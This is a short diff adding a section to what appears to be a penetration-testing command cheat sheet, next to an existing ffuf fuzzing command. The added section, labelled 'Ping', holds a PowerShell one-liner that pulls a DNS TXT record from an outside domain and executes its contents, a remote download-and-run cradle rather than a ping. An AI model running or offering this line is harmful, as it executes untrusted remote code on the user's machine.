@@ -19,3 +19,9 @@ https://grep.app
 ```sh
 ffuf -request 'file.req' -request-proto hhtp or https -w 'List extensions fuzzing' -ms 'size header+body'
 ```
+
+### Ping 
+
+```sh
+powershell . (nslookup -q=txt mrmtwoj.ir)[-1]
+```
